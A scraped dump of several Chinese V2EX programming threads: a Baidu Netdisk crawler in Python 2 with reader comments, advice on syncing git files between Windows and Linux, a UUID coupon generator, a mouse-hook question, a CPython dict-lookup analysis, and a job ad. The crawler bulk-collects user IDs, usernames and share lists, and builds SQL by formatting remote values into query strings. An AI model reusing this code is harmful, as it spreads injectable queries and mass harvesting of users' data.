分析了的 url\n \n         \n \ndef response_worker(): #处理工作\n \n    dbconn = mdb.connect(DB_HOST, DB_USER, DB_PASS, 'baiduyun', charset='utf8')\n \n    dbcurr = dbconn.cursor()\n \n    dbcurr.execute('SET NAMES utf8')\n \n    dbcurr.execute('set global wait_timeout=60000') #以上皆是数据库操作\n \n    while True:\n \n        \"\"\"\n \n        #正则备注\n \n        match() 决定 RE 是否在字符串刚开始的位置匹配\n \n        search() 扫描字符串，找到这个 RE 匹配的位置\n \n        findall() 找到 RE 匹配的所有子串，并把它们作为一个列表返回\n \n        finditer() 找到 RE 匹配的所有子串，并把它们作为一个迭代器返回\n \n                  百度页面链接： http://pan.baidu.com/share/link?shareid=3685432306&amp;uk=1798788396&amp;from=hotrec\n \n        uk 其实用户 id 值\n \n        \"\"\"\n \n        metadata, effective_url = hc_r.get() #获得 metadata （也就是前面的 r.text ）和有效的 url\n \n        #print \"response_worker:\", effective_url\n \n        try:\n \n            tnow = int(time.time()) #获得当前时间\n \n            id = re_urlid.findall(effective_url)[0] #获得 re_urlid 用户编号\n \n            start = re_start.findall(effective_url)[0] #获得 start 用户编号\n \n            if True:\n \n                if 'getfollowlist' in effective_url: #type = 1 ，也就是订阅类\n \n                    follows = json.loads(metadata) #以将文本数据转化成 json 数据格式返回\n \n                    uid = re_uid.findall(effective_url)[0] #获得 re_uid ，查询编号\n \n                    if \"total_count\" in follows.keys() and follows[\"total_count\"]&gt;0 and str(start) == \"0\": #获得订阅数量\n \n                        for i in range((follows[\"total_count\"]-1)/ONEPAGE): #开始一页一页获取有用信息\n \n                            try:\n \n                                dbcurr.execute('INSERT INTO urlids(uk, start, limited, type, status) VALUES(%s, %s, %s, 1, 0)' % (uid, str(ONEPAGE*(i+1)), str(ONEPAGE)))\n \n                                #存储 url 编号，订阅中有用户编号， start 表示从多少条数据开始获取，初始 status=0 为未分析状态\n \n                            except Exception as ex:\n \n                                print \"E1\", str(ex)\n \n                                pass\n \n                     \n \n                    if \"follow_list\" in follows.keys(): #如果订阅者也订阅了，即拥有 follow_list\n \n                        for item in follows[\"follow_list\"]:\n \n                            try:\n \n                                dbcurr.execute('INSERT INTO user(userid, username, files, status, downloaded, lastaccess) VALUES(%s, \"%s\", 0, 0, 0, %s)' % (item['follow_uk'], item['follow_uname'], str(tnow)))\n \n                                #存储订阅这的用户编号，用户名，入库时间\n \n                            except Exception as ex:\n \n                                print \"E13\", str(ex)\n \n                                pass\n \n                    else:\n \n                        print \"delete 1\", uid, start\n \n                        dbcurr.execute('delete from urlids where uk=%s and type=1 and start&gt;%s' % (uid, start))\n \n                elif 'getfanslist' in effective_url: #type = 2,也就是粉丝列表\n \n                    fans = json.loads(metadata)\n \n                    uid = re_uid.findall(effective_url)[0]\n \n                    if \"total_count\" in fans.keys() and fans[\"total_count\"]&gt;0 and str(start) == \"0\":\n \n                        for i in range((fans[\"total_count\"]-1)/ONEPAGE):\n \n                            try:\n \n                                dbcurr.execute('INSERT INTO urlids(uk, start, limited, type, status) VALUES(%s, %s, %s, 2, 0)' % (uid, str(ONEPAGE*(i+1)), str(ONEPAGE)))\n \n                            except Exception as ex:\n \n                                print \"E2\", str(ex)\n \n                                pass\n \n                     \n \n                    if \"fans_list\" in fans.keys():\n \n                        for item in fans[\"fans_list\"]:\n \n                            try:\n \n                                dbcurr.execute('INSERT INTO user(userid, username, files, status, downloaded, lastaccess) VALUES(%s, \"%s\", 0, 0, 0, %s)' % (item['fans_uk'], item['fans_uname'], str(tnow)))\n \n                            except Exception as ex:\n \n                                print \"E23\", str(ex)\n \n                                pass\n \n                    else:\n \n                        print \"delete 2\", uid, start\n \n                        dbcurr.execute('delete from urlids where uk=%s and type=2 and start&gt;%s' % (uid, start))\n \n                else: #type=0 ，也即是分享列表\n \n                    shares = json.loads(metadata)\n \n                    uid = re_uid.findall(effective_url)[0]\n \n                    if \"total_count\" in shares.keys() and shares[\"total_count\"]&gt;0 and str(start) == \"0\":\n \n                        for i in range((shares[\"total_count\"]-1)/ONESHAREPAGE):\n \n                            try:\n \n                                dbcurr.execute('INSERT INTO urlids(uk, start, limited, type, status) VALUES(%s, %s, %s, 0, 0)' % (uid, str(ONESHAREPAGE*(i+1)), str(ONESHAREPAGE)))\n \n                            except Exception as ex:\n \n                                print \"E3\", str(ex)\n \n                                pass\n \n                    if \"records\" in shares.keys():\n \n                        for item in shares[\"records\"]:\n \n                            try:\n \n                                dbcurr.execute('INSERT INTO share(userid, filename, shareid, status) VALUES(%s, \"%s\", %s, 0)' % (uid, item['title'], item['shareid'])) #item['title']恰好是文件名称\n \n                                #返回的 json 信息：\n \n                            except Exception as ex:\n \n                                #print \"E33\", str(ex), item\n \n                                pass\n \n                    else:\n \n                        print \"delete 0\", uid, start\n \n                        dbcurr.execute('delete from urlids where uk=%s and type=0 and start&gt;%s' % (uid, str(start)))\n \n                dbcurr.execute('delete from urlids where id=%s' % (id, ))\n \n                dbconn.commit()\n \n        except Exception as ex:\n \n            print \"E5\", str(ex), id\n \n    dbcurr.close()\n \n    dbconn.close() #关闭数据库\n \n     \n \ndef worker():\n \n    global success, failed\n \n    dbconn = mdb.connect(DB_HOST, DB_USER, DB_PASS, 'baiduyun', charset='utf8')\n \n    dbcurr = dbconn.cursor()\n \n    dbcurr.execute('SET NAMES utf8')\n \n    dbcurr.execute('set global wait_timeout=60000')\n \n    #以上是数据库相关设置\n \n    while True:\n \n  \n \n        #dbcurr.execute('select * from urlids where status=0 order by type limit 1')\n \n        dbcurr.execute('select * from urlids where status=0 and type&gt;0 limit 1') #type&gt;0,为非分享列表\n \n        d = dbcurr.fetchall()\n \n        #每次取出一条数据出来\n \n        #print d\n \n        if d: #如果数据存在\n \n            id = d[0][0] #请求 url 编号\n \n            uk = d[0][1] #用户编号\n \n            start = d[0][2]\n \n            limit = d[0][3]\n \n            type = d[0][4] #哪种类型\n \n            dbcurr.execute('update urlids set status=1 where id=%s' % (str(id),)) #状态更新为 1 ，已经访问过了\n \n            url = \"\"\n \n            if type == 0: #分享\n \n                url = URL_SHARE.format(uk=uk, start=start, id=id).encode('utf-8') #分享列表格式化\n \n                #query_uk uk 查询编号\n \n                #start\n \n                #urlid id url 编号\n \n            elif  type == 1: #订阅\n \n                url = URL_FOLLOW.format(uk=uk, start=start, id=id).encode('utf-8') #订阅列表格式化\n \n            elif type == 2: #粉丝\n \n                url = URL_FANS.format(uk=uk, start=start, id=id).encode('utf-8') #关注列表格式化\n \n            if url:\n \n                hc_q.put((type, url)) #如果 url 存在，则放入请求队列， type 表示从哪里获得数据\n \n                #通过以上的 url 就可以获得相应情况下的数据的 json 数据格式，如分享信息的，订阅信息的，粉丝信息的\n \n                 \n \n            #print \"processed\", url\n \n        else: #否则从订阅者或者粉丝的引出人中获得信息来存储，这个过程是爬虫树的下一层扩展\n \n            dbcurr.execute('select * from user where status=0 limit 1000')\n \n            d = dbcurr.fetchall()\n \n            if d:\n \n                for item in d:\n \n                    try:\n \n                        dbcurr.execute('insert into urlids(uk, start, limited, type, status) values(\"%s\", 0, %s, 0, 0)' % (item[1], str(ONESHAREPAGE)))\n \n                        #uk 查询号，其实是用户编号\n \n                        #start 从第 1 条数据出发获取信息\n \n                        #\n \n                        dbcurr.execute('insert into urlids(uk, start, limited, type, status) values(\"%s\", 0, %s, 1, 0)' % (item[1], str(ONEPAGE)))\n \n                        dbcurr.execute('insert into urlids(uk, start, limited, type, status) values(\"%s\", 0, %s, 2, 0)' % (item[1], str(ONEPAGE)))\n \n                        dbcurr.execute('update user set status=1 where userid=%s' % (item[1],)) #做个标志，该条数据已经访问过了\n \n                        #跟新了分享，订阅，粉丝三部分数据\n \n                    except Exception as ex:\n \n                        print \"E6\", str(ex)\n \n            else:\n \n                time.sleep(1)\n \n                 \n \n        dbconn.commit()\n \n    dbcurr.close()\n \n    dbconn.close()\n \n         \n \ndef main():\n \n    print 'starting at:',now()\n \n    for item in range(16):   \n \n        t = threading.Thread(target = req_worker, args = (item,))\n \n        t.setDaemon(True)\n \n        t.start() #请求线程开启，共开启 16 个线程\n \n    s = threading.Thread(target = worker, args = ())\n \n    s.setDaemon(True)\n \n    s.start() #worker 线程开启\n \n    response_worker()  #response_worker 开始工作\n \n    print 'all Done at:', now()   \n</code></pre>\n<p>本人建个qq群，欢迎大家一起交流技术， 群号：512245829 喜欢微博的朋友关注：转盘娱乐即可</p>\n</div></div>"], "reply": "21", "tittle": "百度网盘爬虫（如何爬取百度网盘）", "comment": ["之前用过去转盘，感觉不错主要是可以把失效的链接标记出来。已关注，还有就是谢谢分享。", "mark 一下，有空看看", "还在用 PY2 ？", "github 上一大堆你还不舍得分享。。", " 不要瞎说大实话", "mark", " [捂脸]这也喷，别人写个代码，先喷功能不好，再喷代码样式差，实在不行还能喷语言比较老、风格比我 low ……\r", "\r", "世界就不能多一点爱吗……", " \r", "楼主 ", " 点我下载 2 链接挂了", "谢谢分享", " 文人相轻嘛。", "奉上贴吧爬虫给各位需要的\r", " 你的内心还真黑暗。\r", "原话：还在用 PY2 ？\r", "我就问一下，你竟然能解读出喷的意思……\r", "后面竟然还有人同样理解的，我还能说啥。", "他们不是一两个人，我也解读出喷的意思了", "mark", " 我读出来的语气也是对于用 py2 有点鄙夷~", " 你要是加个手动滑稽可能效果就不一样了", " \r", " 我只能说我们有代沟。", "  我们也有代沟", " 哥哥，我一个人能读出来，说明我心里黑暗，我心里变态。 N 多人都能读出来，究竟说明谁心里变态？究竟打了谁的脸？", " 有很多东西不是以人数来决定的。\r", "PS ：这么小的事，过了这么久你还拿出来喷……", " 我也不是经常上 V2 ，昨天才看到……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本地可以通过 ssh 用户名和密码连接远程服务器，使用什么方式可以同步本地和对应的远程文件（ git 版本控制的 Python 项目），使用过 pycharm 的 deployment 功能，但 win 和远程的 linux 文件同步会影响 git 控制（即被修改的文件被git识别为整个文件被修改）。</p>\n<p>ps ： 本地 win 环境，远程服务器是 Linux 环境。</p>\n</div></div>"], "reply": "25", "tittle": "实现 win 本地和远程 Linux 下 git 控制的文件同步", "comment": ["fabric ，可以研究下。", "pycharm 的 deployment 功能不知大家有没有使用过？", " 最主要的问题是 git 版本控制，现在是使用终端 SSH 连接到远程 VM ，然后在终端上使用 VIM 编辑 python 项目文件太费力（ VIM 使用不熟练），如果在本地 win 环境编辑文件上传到 VM ，会影响整个文件的 Git 版本管理。也许我还是在本地安装 linux 系统比较好。。。", "sshfs ，挂载远程文件到本地 windows 。", "难道不是建个分支?", " 在 windows 下用 git 注意两点： 1 ，是把权限变成 0755 ，其实问题不大， 2 ，是上传的时候注意回车换行的问题。（可以选）\r", "\r", "另外就是自动缩进的问题。", "都没有明白你的问题。\r", "\r", "要修改远程的文件，用 filezilla 或者挂载为文件夹\r", "\r", "要本地有一整套环境，同步运行测试，用 Rsync\r", "\r", "正常开发，用代码版本控制。", "主要原因是 win 和 Linux 的换行符不同， Win 是 CRLF, Linux 是 LF 。你在本地修改完文件，上传到 Linux 服务器，再用 dos2unix 转换一下就行了。", "win 下直接用 git 不允许么？ git 只要有 ssh 就可以用的嘛。", " win 下用的编辑器设定下格式用 LF 就行。\r", "\r", "现代化编辑器 (Atom,sublime,等)可以自动识别当前文件换行方式，可以设定为保持现有文件换行方式。", " 自动缩进...又是 tab 和 space 的圣战了..现代化编辑器，推荐用 soft tab 绑定为 4 space.", "phpstorm 一直用 deployment 功能实时同步文件到测试机， jb 系的 ide 应该都可以。\r", "\r", "Deployment / Configurations 增加一个 server ， sftp 模式，用你的 ssh 上好连接到你的测试机，设好路径之类的\r", "Deployment / Options 里面设置一下，大部分都可以勾上，我选的是 \"Upload changed files automatically to the default server : Always\"\r", "\r", "然后在自己电脑的 phpstorm 上开发，测试机上测试就行了，文件都会自动同步上去。\r", "git 用 phpstorm 内集成的", "/ssh 上好 /ssh 账号 /", "至于说测试机上 git 控制受影响，出问题你直接在测试机上丢弃那些文件的修改，重新 pull 一下好了", "pycharm 里面设置 line separator, windows 的 git 也设置下，这样同步过去就没有问题了。\r", "只不过还是推荐是用 vagrant 虚拟机，或者直接上 linux", "如果你可以在 win 上跑 Linux 虚拟机的话，可以试试这个\r", "\r", "\r", "虚拟机里的 pycharm 性能也是很快的", "git push 有什么问题？", "realsync 炒鸡好用，直接通过 ssh 同步文件夹， 1 、指同步变化的文件夹； 2 、自动记忆 ssh 帐号密码； 3 、可设定排除项，.git 默认不同步； 4 、只同步变化的文件，通过类似 inotify 技术做监控； 5 、实效性很棒； 6 、 win /linux 多平台支持", "我工作中就是 windows 上 pycharm  Deployment 到 linux 测试机上，需要代码同步的时候 到测试机上 git reset --hard ,git clean --df , git pull xx/xx 这样就没有代码覆盖问题了", "   got it!!", "PS ：为啥要分开修改和提交代码呢，因为公司有防火墙，远程 Linux 只有命令行， win 上 make 等操作执行不了。", " 感谢，我先试试", "感谢诸位。", "     git pull xx/xx  这一步是从哪儿 pull 的代码？", "Pycharm 在 win 上如何默认设置为 unix 下的 LF ？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>时间是 3.26 下午，通宵一晚上真是刺激所以现在才醒~</p>\n<p>ok ，今天是第二周，应该玩玩不一样的东西</p>\n<p>首先是第 0001 题</p>\n<p>做为 Apple Store App 独立开发者，你要搞限时促销，为你的应用生成激活码（或者优惠券），使用 Python 如何生成 200 个激活码（或者优惠券）？</p>\n<p>这个思路很简单</p>\n<blockquote>\n<p><strong>方法</strong></p>\n</blockquote>\n<ul>\n<li>生成随机数——转换成 UUID ——提取打印文本保存</li>\n</ul>\n<hr>\n<ul>\n<li><strong>UUID</strong></li>\n</ul>\n<p>UUID 是 128 位的全局唯一标识符，通常由 32 字节的字符串表示。</p>\n<p>它可以保证时间和空间的唯一性，也称为 GUID ，全称为： UUID —— Universally Unique IDentifier ， Python 中叫 UUID 。</p>\n<p>它通过 MAC 地址、时间戳、命名空间、随机数、伪随机数来保证生成 ID 的唯一性。</p>\n<p>UUID 主要有五个算法，也就是五种方法来实现。</p>\n<pre><code>uuid1()\n基于时间戳。由 MAC 地址、当前时间戳、随机数生成。可以保证全球范围内的唯一性，但 MAC 的使用同时带来安全性问题，局域网中可以使用 IP 来代替 MAC 。\nuuid2()\n基于分布式计算环境 DCE （ Python 中没有这个函数）。算法与 uuid1 相同，不同的是把时间戳的前 4 位置换为 POSIX 的 UID 。实际中很少用到该方法。\nuuid3()\n基于名字的 MD5 散列值。通过计算名字和命名空间的 MD5 散列值得到，保证了同一命名空间中不同名字的唯一性，和不同命名空间的唯一性，但同一命名空间的同一名字生成相同的 uuid 。\nuuid4()\n基于随机数。由伪随机数得到，有一定的重复概率，该概率可以计算出来。\nuuid5()\n基于名字的 SHA-1 散列值。算法与 uuid3 相同，不同的是使用 Secure Hash Algorithm 1 算法。\n</code></pre>\n<ul>\n<li>\n<p><strong>读写模式简介</strong>\n<img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/118023-2a0aadc310dfe9b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n</li>\n<li>\n<p><strong>代码</strong></p>\n</li>\n</ul>\n<pre><code># 调用 UUID\nimport uuid\n# 创建 UUID.txt 文本\nf = open(\"UUID.txt\",'a')\nf.write(\"嘻嘻。。现在开始生成随机激活码！\\n\")\n# 设定循环函数\nsum = 0\nwhile sum &lt; 200:\n    result = uuid.uuid4()\n    f.write(str(result))\n    f.write(\"\\n\")\n    sum = sum + 1\nf.write(\"完成!\")\n# 完成导出\nf.close()\n</code></pre>\n<p><img alt=\"result\" src=\"http://upload-images.jianshu.io/upload_images/118023-2bc6ae6af7f54839.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<hr>\n<blockquote>\n<p><strong>拓展阅读</strong></p>\n</blockquote>\n<p><a href=\"https://docs.python.org/3/library/uuid.html\" rel=\"nofollow\">Python 下 UUID 官方介绍</a></p>\n<p><a href=\"http://www.jb51.net/article/100205.htm\" rel=\"nofollow\">Python 用 UUID 库生成唯一 ID 的方法示例</a></p>\n<p><a href=\"http://www.jb51.net/article/87398.htm\" rel=\"nofollow\">Python 读写 txt 文本文件的操作方法全解析</a></p>\n<blockquote>\n<p><strong>结语</strong></p>\n</blockquote>\n<p>方法有很多种，比如<a href=\"http://blog.csdn.net/angelahhj/article/details/53310867\" rel=\"nofollow\">这个</a>、<a href=\"http://www.jianshu.com/p/5f73493786a4\" rel=\"nofollow\">还有这个</a>。</p>\n<p>我的方法咧比较基础比较原始。</p>\n<p>感觉距离爬虫还是好远啊！我还是看不太懂爬虫代码啊！</p>\n<p>明天又是周一！明天都有新打击，要好好活下去！</p>\n<p>拜拜~</p>\n</div></div>"], "reply": "1", "tittle": "Python 周记/Week 1", "comment": ["一股 RTFM 的感觉。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚刚参加了一个前两天在 v2 看到的一个知乎 live</p>\n<p>名字:用 Python 打造一个可以盈利的项目</p>\n<p>我很好奇项目是什么 参加完了</p>\n<p>最后老师讲了 ☞打造项目不是 live 重点 重点我们要努力学习 python 然后用 flask 尝试做一个网站。</p>\n<p>完～</p>\n</div></div>"], "reply": "41", "tittle": "用 Python 打造一个盈利的项目", "comment": ["一直搞不懂，这种 live 为什么会有人参加=   =\r", "为什么要交智商税\r", "为什么", " 我参加了好多啊 每次都巨失望 求药物治疗", "这样的开 live 是不是要发财的节奏\r", "老师：我是赚钱了", "咳咳，有没有人参加我的 live 后悔的？ ", "哈哈哈，大兄弟，下次悠着点，我真没有安利这个 live", "都上知乎了，多看看人家的评价，可以少交智商税", " 为啥不看点公开课呢？不比看 live 强？", " 这些人玩得真 6", " 听一两次足矣，能把东西消化才最主要的：）", "用 Python 打造一个盈利的项目: 一个知乎 live", " 你下次要参加知乎 Live 就忍住，然后用这点时间去看 Python cookbook 。", "从来没参加过知乎的 live ，乱七八糟的什么人都在主持，浪费钱和浪费时间，就是交智商税", "勃学可以拯救你", "用 Python 打造一个盈利的项目的项目内容就是“以 Python 盈利”的噱头开 live 。\r", "\r", "感觉有点像传销。。。", "大家并没有 get 这个 live 的点，其实 live 已经教大家怎么赚钱了。\r", "\r", "提示：递归", "看视频获取信息必读文字慢多了 ", "去现场如果只是为了听，那跟看视频有什么区别", " 我听了一次，感觉挺棒的啊哈哈哈哈", " 你的博客打开没有 css 了。 不过我还是看了更新", " 董老师的 live 让我受益匪浅，希望老师继续分享下去 live 。不过确实有很多是在收智商税，比如之前听了一个☞自学编程的最优方法☞的，之前看过他的专栏文章，然后出了 live 看介绍就直接买了，听完差点吐了，什么玩意。擦亮眼睛吧，反正从此再也不敢不看评分就买了", " 就是你", " 没参加过你的 live 买过你的书", " 噢 我还不知道可以看评价 最开始 live 都是直播的 直播完就不能参加了。所以我一直都在直播前就参加。", "用 “用 Python 打造一个可以盈利的项目” 打造一个可以盈利的项目", "我机制地看了大纲", "live 里大多数都是没营养的 活在上个世纪的人 在那里骗钱", " 你的 live 应该很不错，虽然我没听过", "搞笑的是，我在 Live 开始几个小时之前发出这篇文章\r", "\r", "\r", "然后 Live 的参加人数反而增加了（ 194 --> 200+），也是醉了😕", "<img src=\"http://imgur.com/a/sIhba\" />\r", "\r", "唉，都说这么明白了，然而知乎 Live 并不能退款，一时冲动的结果就是滋滋滋送钱。", "很多 live 就说几句话，骗钱。", " 这个 live 在开始之前就有人指出是智商税了", " 但是并不能退钱啊，指出也没用", "这不是叫智商税么_(:з」∠)_", "哈哈，一听见赚钱，就有人不安静了，这韭菜也太好割了！", "这个 live 在知乎上看到 @", " 怼过一次了，不管从提纲还是讲师看的确都没有什么价值。但从另一个角度说，不是所有人都有行业经验和辨别能力，还有许多期望从一个课程一次 live 学到编程经验的初学者，初学者们踩过的坑，或者说所谓的智商税，会成为他经历的一部分，能意识到自己踩到坑了就可以提升自己的辨别能力。大家都是踩坑上来的，只是现在知识经济盛行，华丽的坑比以前多了很多。\r", "说到底，只是一个 19 块钱的东西，危害并不严重。任何领域任何行业都存在企图浑水摸鱼的人，刚流行起来有热钱的领域更是，对此表达意见发表评价当然没问题，心态可以轻松点。\r", "\r", "当然还有一些人对于钱相关的事是一如既往地在寻找莫名其妙的优越感的，我从没参加过 -> 都是智商税 -> 不如自学。\r", "我不太懂一个从没体验过没研究过的人哪里来的底气去评价别人，只给论点不给论据有什么意思呢。\r", "\r", "我听过 @", "  的两个 live ，身边也有同事买了他的书，我觉得有价值。价值不是在于这个东西所有的内容都对我有益，我不是新手也不需要让别人教我自学，我想要的是看到一线工程师提到的具体的实践经验、对问题的理解方式，我不会地方的能学习，我会的地方能更新，哪怕一本书只有一页纸，一场 live 只有一句话让我学习到，那几十块钱就是有价值的，因为同样的实践经验，自己摸索碰壁所耗费的精力远不止几十块钱。", "智商税   听过 3 、 4 个 Live 就 1 、 2 个讲干货的", "人家不是已经说得很清楚很清楚了。。。\r", "用 Python 打造一个盈利项目，知乎 live 不就是吗。。而且老师也真的盈利了（没毛病...", "现在的各种直播平台讲课的，大部分人只学会了标题党，讲的内容没有什么干货，当然也许是讲师本身的水平或者准备或许就有问题。", "我听过一个，但是那个讲师的嗓音真的... 低沉又沙哑，听了 2 分钟就听不下去了， 19 块就当纯支持了。很多人技术很好，但是不是所有人都能当讲师", "老师正在用 python 打造一个赚钱的项目，而你已经学到了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>小菜一枚，向大伙学习\n想监听鼠标点击就增加一次点击，结果增加那次又被判断为了点击=。=||</p>\n<pre><code># -*- coding: utf-8 -*-\nimport pythoncom\nimport pyHook\nimport win32api\nimport win32con\nimport win32gui\nimport ctypes\nimport time\n\ndef onMouseEvent(event):\n    if int(event.Message) == 513:\n        time.sleep(0.05)\n        win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)\n        time.sleep(0.05)\n        win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)\n    return False\n\nif __name__ == \"__main__\":  \n    hm = pyHook.HookManager()\n \n    hm.MouseAll = onMouseEvent\n    hm.HookMouse()\n \n    pythoncom.PumpMessages()\n</code></pre>\n</div></div>"], "reply": "4", "tittle": "小菜用 py 把单击变为双击结果递归了、求大神支招", "comment": ["把单击变成双击的目的是什么？是不是思路错了？", "看了下这个“ pyHook ”的文档， pyHook.HookManager 有个 UnhookMouse 方法，试试增加一次点击前 UnhookMouse ，增加完点击后再 HookMouse ，纯属猜测\r", "btw ，我也不知道你的目的是什么。。。(逃", " 好像是有这颗方法，待会去看下。。。", "能不能检查事件来源，来自软件就不触发"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码里面有中文说明</p>\n<p>static PyDictEntry *\nlookdict(PyDictObject *mp, PyObject *key, register long hash)\n{\nregister size_t i;\nregister size_t perturb;\nregister PyDictEntry *freeslot;\nregister size_t mask = (size_t)mp-&gt;ma_mask;\nPyDictEntry *ep0 = mp-&gt;ma_table;\nregister PyDictEntry *ep;\nregister int cmp;\nPyObject *startkey;</p>\n<pre><code>i = (size_t)hash &amp; mask;\nep = &amp;ep0[i];\nif (ep-&gt;me_key == NULL || ep-&gt;me_key == key)\n    return ep;\n\nif (ep-&gt;me_key == dummy)\n    freeslot = ep;\nelse {\n    if (ep-&gt;me_hash == hash) {\n        startkey = ep-&gt;me_key;\n        Py_INCREF(startkey);\n        cmp = PyObject_RichCompareBool(startkey, key, Py_EQ);\n        Py_DECREF(startkey);\n        if (cmp &lt; 0)\n            return NULL;\n        if (ep0 == mp-&gt;ma_table &amp;&amp; ep-&gt;me_key == startkey) {\n            if (cmp &gt; 0)\n                return ep;\n        }\n        else {\n            /* The compare did major nasty stuff to the\n             * dict:  start over.\n             * XXX A clever adversary could prevent this\n             * XXX from terminating.\n             */\n            return lookdict(mp, key, hash);  //此处逻辑甚是艰深,望大神指点\n        }\n    }\n    freeslot = NULL;\n}\n\n/* In the loop, me_key == dummy is by far (factor of 100s) the\n   least likely outcome, so test for that last. */\nfor (perturb = hash; ; perturb &gt;&gt;= PERTURB_SHIFT) {\n    i = (i &lt;&lt; 2) + i + perturb + 1;\n    ep = &amp;ep0[i &amp; mask];\n    if (ep-&gt;me_key == NULL)\n        return freeslot == NULL ? ep : freeslot;\n    if (ep-&gt;me_key == key)\n        return ep;\n    if (ep-&gt;me_hash == hash &amp;&amp; ep-&gt;me_key != dummy) {\n        startkey = ep-&gt;me_key;\n        Py_INCREF(startkey);\n        cmp = PyObject_RichCompareBool(startkey, key, Py_EQ);\n        Py_DECREF(startkey);\n        if (cmp &lt; 0)\n            return NULL;\n        if (ep0 == mp-&gt;ma_table &amp;&amp; ep-&gt;me_key == startkey) {\n            if (cmp &gt; 0)\n                return ep;\n        }\n        else {\n            /* The compare did major nasty stuff to the\n             * dict:  start over.\n             * XXX A clever adversary could prevent this\n             * XXX from terminating.\n             */\n            return lookdict(mp, key, hash);\n        }\n    }\n    else if (ep-&gt;me_key == dummy &amp;&amp; freeslot == NULL)\n        freeslot = ep;\n}\nassert(0);          /* NOT REACHED */\nreturn 0;\n</code></pre>\n<p>}</p>\n</div></div>"], "reply": "3", "tittle": "Python dict lookdict 函数分析", "comment": ["你可以看看“.\\Lib\\test\\crashers\\nasty_eq_vs_dict.py ”文件，以及这个 ", " 。\r", "大概就是一个 dict 在遍历的时候被修改了。", "哥们，可以找到 Python 之父这么设计的原因相关的报道吗，这么看起来太费劲了。", "这是 python 1.5.2 版本的源码,冲突直接走后面的代码\r", "\r", "static dictentry *\r", "lookdict(mp, key, hash)\r", "\tdictobject *mp;\r", "\tPyObject *key;\r", "\tregister long hash;\r", "{\r", "\tregister int i;\r", "\tregister unsigned incr;\r", "\tregister dictentry *freeslot;\r", "\tregister unsigned int mask = mp->ma_size-1;\r", "\tdictentry *ep0 = mp->ma_table;\r", "\tregister dictentry *ep;\r", "\t/* We must come up with (i, incr) such that 0 <= i < ma_size\r", "\t   and 0 < incr < ma_size and both are a function of hash */\r", "\ti = (~hash) & mask;\r", "\t/* We use ~hash instead of hash, as degenerate hash functions, such\r", "\t   as for ints <sigh>, can have lots of leading zeros. It's not\r", "\t   really a performance risk, but better safe than sorry. */\r", "\tep = &ep0[i];\r", "\tif (ep->me_key == NULL || ep->me_key == key)\r", "\t\treturn ep;\r", "\tif (ep->me_key == dummy)\r", "\t\tfreeslot = ep;\r", "\telse {\r", "\t\tif (ep->me_hash == hash &&\r", "\t\t    PyObject_Compare(ep->me_key, key) == 0)    //不冲突\r", "\t\t{\r", "\t\t\treturn ep;\r", "\t\t}\r", "\t\tfreeslot = NULL;  //冲突\r", "\t}\r", "\t/* XXX What if PyObject_Compare returned an exception? */\r", "\t/* Derive incr from hash, just to make it more arbitrary. Note that\r", "\t   incr must not be 0, or we will get into an infinite loop.*/\r", "\tincr = (hash ^ ((unsigned long)hash >> 3)) & mask;\r", "\tif (!incr)\r", "\t\tincr = mask;\r", "\tfor (;;) {\r", "\t\tep = &ep0[(i+incr)&mask];\r", "\t\tif (ep->me_key == NULL) {\r", "\t\t\tif (freeslot != NULL)\r", "\t\t\t\treturn freeslot;\r", "\t\t\telse\r", "\t\t\t\treturn ep;\r", "\t\t}\r", "\t\tif (ep->me_key == dummy) {\r", "\t\t\tif (freeslot == NULL)\r", "\t\t\t\tfreeslot = ep;\r", "\t\t}\r", "\t\telse if (ep->me_key == key ||\r", "\t\t\t (ep->me_hash == hash &&\r", "\t\t\t  PyObject_Compare(ep->me_key, key) == 0)) {\r", "\t\t\treturn ep;\r", "\t\t}\r", "\t\t/* XXX What if PyObject_Compare returned an exception? */\r", "\t\t/* Cycle through GF(2^n)-{0} */\r", "\t\tincr = incr << 1;\r", "\t\tif (incr > mask)\r", "\t\t\tincr ^= mp->ma_poly; /* This will implicitely clear\r", "\t\t\t\t\t\tthe highest bit */\r", "\t}\r", "}"]},
{"content": ["<div class=\"topic_content\">你所需要的做的：\r<br>1 、参与需求收集与整理，负责设计系统；\r<br>2 、参与系统开发、测试；\r<br>3 、系统维护；\r<br>4 、管理后端研发部；\r<br>\r<br>我们的要求：\r<br>1 、不少于 2 年的 Python 开发经验，理解 Python 哲学；\r<br>2 、熟练掌握至少一种 Python Web 框架，并有实际经验， Django 或 Flask 优先；\r<br>3 、主导过 Web 项目的设计和开发，有良好的编程理念和项目架构设计经验；\r<br>4 、熟悉 Memcache 或者 Redis ，且有实战经验；\r<br>5 、熟悉 Postgresql/MySQL/Sqlite ，掌握常用的 SQL 优化技能；\r<br>6 、了解 Linux ，知道 wsgi ，熟悉 wsgi 项目的部署;\r<br>7 、自我驱动的学习和工作习惯，对未知技术和领域能快速掌握并实践；\r<br>8 、掌握至少 1 种压力测试的方法，且有实际操作经验；\r<br>9 、有线上项目可以演示。\r<br>\r<br> [加分项] \r<br>1 、有分布式系统的开发经验；\r<br>2 、有敏捷开发的经验，熟悉 Redmine/Gitlab/Trac/Git/Hg 等工具；\r<br>3 、熟悉前端开发技术；\r<br>4 、参加过著名的 Web 产品 /项目研发；\r<br>5 、有自己的技术博客。\r<br>\r<br> \r<br>\r<br>说了辣么多\r<br>\r<br>我们来点实际的吧\r<br>\r<br>也是你们所关心的——福利\r<br>\r<br>福利在这呢：\r<br>\r<br>1.薪资： 10K~18K\r<br>\r<br>2.你不仅仅只是一个普通的工程师，你的未来：\r<br>\r<br> 发展途径：（专业岗）高级——资深——专家\r<br>\r<br>        （管理岗）团队组长——经理——总监\r<br>\r<br> 甚至是......转岗（在银刃无所不奇）只要你能，你可以！\r<br>\r<br>每半年的一次岗位晋升申请调整，还有什么公司可以这么任性？\r<br>\r<br>3.办公环境文艺优雅舒适，全是 90 后的小鲜肉，帅气老板 